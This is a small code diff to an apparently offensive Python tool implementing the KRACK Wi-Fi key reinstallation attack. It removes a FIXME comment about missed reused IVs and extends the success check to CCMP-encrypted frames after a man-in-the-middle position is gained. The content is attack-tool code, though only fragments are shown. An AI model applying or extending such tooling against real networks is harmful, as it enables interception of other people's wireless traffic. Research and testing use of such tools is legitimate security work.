@@ -327,8 +327,6 @@ class KRAckAttack():
 		iv = dot11_get_iv(p)
 		if iv <= 1: log(DEBUG, "Ciphertext: " + encrypted.encode("hex"), showtime=False)
 
-		# FIXME:
-		# - The reused IV could be one we accidently missed due to high traffic!!!
 		if client.is_iv_reused(iv):
 			# If the same keystream is reused, we have a normal key reinstallation attack
 			if keystream == client.get_keystream(iv):
@@ -509,7 +507,7 @@ class KRAckAttack():
 				# Client is sending on rogue channel, we got a MitM position =)
 				client.mark_got_mitm()
 
-				if p.haslayer(Dot11WEP):
+				if p.haslayer(Dot11WEP) or p.haslayer(Dot11CCMP):
 					# Use encrypted frames to determine if the key reinstallation attack succeeded
 					# 檢查 KRACK攻擊有沒有成功，
 					self.handle_from_client_pairwise(client, p)
